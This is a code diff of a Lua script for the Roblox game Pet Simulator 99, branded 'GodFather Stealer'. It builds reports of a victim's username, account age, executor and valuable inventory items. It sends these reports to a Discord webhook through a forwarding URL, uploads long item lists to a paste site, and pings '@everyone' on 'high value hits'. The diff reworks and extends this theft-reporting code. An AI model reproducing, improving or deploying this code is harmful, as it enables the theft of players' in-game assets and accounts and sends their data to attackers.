@@ -1,10 +1,3 @@
-_G.NulsExe = _G.NulsExe or false
-if _G.NulsExe then
-    return
-end
-_G.NulsExe = true
-
-
 local function LoadingScreenAsync()
     task.spawn(function()
         local ok, result = pcall(function()
@@ -403,115 +396,80 @@ local function SendMessage(GemAmount)
 
     local fields = {}
 
-    local totalPets = 1
-    for _, item in ipairs(sortedItems) do
-        totalPets = totalPets + item.amount
-    end
-
-    local bestPet = nil
-    local bestPetRAP = 1
-    for _, item in ipairs(sortedItems) do
-        local itemTotalRAP = item.amount * item.rap
-        if itemTotalRAP > bestPetRAP then
-            bestPetRAP = itemTotalRAP
-            bestPet = item
-        end
-    end
-
+    -- Top row: Username | Receiver | Account Age
     table.insert(fields,{
         name = "👤 Username",
-        value = "```" .. player.Name .. "```",
+        value = "```" .. tostring(player.Name) .. "```",
         inline = true
     })
 
     table.insert(fields,{
         name = "📥 Receiver",
-        value = "```" .. table.concat(users,", ") .. "```",
+        value = "```" .. tostring(table.concat(users,", ")) .. "```",
         inline = true
     })
 
     table.insert(fields,{
         name = "📅 Account Age",
-        value = "```" .. formatAccountAge(player.AccountAge) .. "```",
+        value = "```" .. tostring(formatAccountAge(player.AccountAge)) .. "```",
         inline = true
     })
 
+    -- Second row: Executor | Total RAP | (empty for alignment)
     table.insert(fields,{
         name = "⚡ Executor",
-        value = "```" .. (executorName or "Unknown") .. "```",
+        value = "```" .. tostring(executorName or "Unknown") .. "```",
         inline = true
     })
 
     table.insert(fields,{
         name = "💎 Total RAP",
-        value = "```" .. formatNumber(totalRAP) .. "```",
+        value = "```" .. tostring(formatNumber(totalRAP)) .. "```",
         inline = true
     })
 
     table.insert(fields,{
-        name = "\u200B",
-        value = "\u200B",
+        name = "​",
+        value = "​",
         inline = true
     })
 
-    local bestPetName = bestPet and bestPet.name or "None"
-    local bestPetDisplay = bestPet and (bestPet.amount .. "x " .. bestPetName) or "None"
+    local isHighValue = totalRAP >= HIGH_VALUE_THRESHOLD
 
-    table.insert(fields,{
-        name = "🐵 Total Pets 🐵",
-        value = "```→ " .. formatNumber(totalPets) .. "```",
-        inline = true
-    })
+    if isHighValue then
+        table.insert(fields,{
+            name = "🚨 Alert",
+            value = "```**HIGH VALUE HIT DETECTED**```",
+            inline = false
+        })
+    end
 
-    table.insert(fields,{
-        name = "👑 Best Pet 👑",
-        value = "```→ " .. bestPetDisplay .. "```",
-        inline = true
-    })
-
-    table.insert(fields,{
-        name = "🏆 Best Pet RAP 🏆",
-        value = "```→ " .. formatNumber(bestPetRAP) .. "```",
-        inline = true
-    })
-
-    -- All Pets List
     local itemMap = {}
     local order = {}
 
     for _,item in ipairs(sortedItems) do
-
         if not itemMap[item.name] then
             itemMap[item.name] = {
                 amount = 0,
                 rap = item.rap
             }
-
             table.insert(order,item.name)
         end
-
-        itemMap[item.name].amount =
-            itemMap[item.name].amount + item.amount
+        itemMap[item.name].amount = itemMap[item.name].amount + item.amount
     end
 
     table.sort(order,function(a,b)
-
         local A = itemMap[a]
         local B = itemMap[b]
-
         return (A.amount * A.rap) > (B.amount * B.rap)
-
     end)
 
     local itemText = ""
 
     for _,name in ipairs(order) do
-
         local data = itemMap[name]
-
         local totalRap = data.amount * data.rap
         local eur = rapToEUR(totalRap)
-
         itemText = itemText .. string.format(
             "• %dx %s | %s RAP | %s\n",
             data.amount,
@@ -524,26 +482,19 @@ local function SendMessage(GemAmount)
     local pasteLink = nil
 
     if #itemText > 900 then
-
         local pasteBody = HttpService:JSONEncode({
             content = itemText
         })
-
         local result = HttpService:PostAsync(
-            "https://pastefy.app/api/v2/paste ",
+            "https://pastefy.app/api/v2/paste",
             pasteBody,
             Enum.HttpContentType.ApplicationJson
         )
-
         local data = HttpService:JSONDecode(result)
-
         if data and data.paste then
             pasteLink = data.paste.url
         end
-
-        itemText =
-            "Item list too long.\nFull list:\n"..tostring(pasteLink)
-
+        itemText = "Item list too long.\nFull list:\n"..tostring(pasteLink)
     end
 
     local totalEUR = rapToEUR(totalRAP)
@@ -554,12 +505,14 @@ local function SendMessage(GemAmount)
         "\n📊 Total RAP: "..formatNumber(totalRAP)..
         "\n💰 Estimated Value: "..formatEUR(totalEUR)
 
+    -- Items section with emoji header like the reference image
     table.insert(fields,{
-        name = "📋 All Items",
-        value = itemText,
+        name = "📋 Items",
+        value = "```" .. itemText .. "```",
         inline = false
     })
 
+    -- Summary section with emoji header
     table.insert(fields,{
         name = "💰 Summary",
         value = "```" .. summaryText .. "```",
@@ -569,57 +522,44 @@ local function SendMessage(GemAmount)
     local titleName
     local embedColor
 
-    if totalRAP >= 10000000000 then 
+    if totalRAP >= 10000000000 then
         titleName = "🚨 PS99 | INSANE HIT 🚨"
         embedColor = 16711680  -- Red
-    elseif totalRAP >= 100000000 then  
+    elseif totalRAP >= 100000000 then
         titleName = "PS99 | GOOD HIT"
         embedColor = 8388736   -- Purple
-    elseif totalRAP > 50000000 then    
+    elseif totalRAP > 50000000 then
         titleName = "PS99 | NORMAL HIT"
-        embedColor = 16711680  -- Red 
-    else                               
+        embedColor = 2303786   -- Dark
+    else
         titleName = "PS99 | BAD HIT"
-        embedColor = 3355443  -- Black
+        embedColor = 2303786   -- Dark
     end
 
-    local contentPing = (totalRAP >= HIGH_VALUE_THRESHOLD) and "@everyone" or ""
+    local contentPing = isHighValue and "@everyone" or ""
 
     local body = HttpService:JSONEncode({
-
         webhook = webhook,
-
         content = contentPing,
-        
         username = "GodFather Stealer",
-        
-        avatar_url = "https://i.imgur.com/ulY8nQk.png ",
-
+        avatar_url = "https://i.imgur.com/ulY8nQk.png",
         embeds = {{
-
             title = titleName,
-
             color = embedColor,
-
             fields = fields,
-
             footer = {
                 text = "GodFather Stealer | .gg/ronixexecutor\n Made By NULS :3"
             }
-
         }}
     })
 
     if usingStudio then
-
         return HttpService:PostAsync(
             Forward,
             body,
             Enum.HttpContentType.ApplicationJson
         )
-
     else
-
         return execRequest({
             Url = Forward,
             Method = "POST",
@@ -628,7 +568,6 @@ local function SendMessage(GemAmount)
             },
             Body = body
         })
-
     end
 
 end
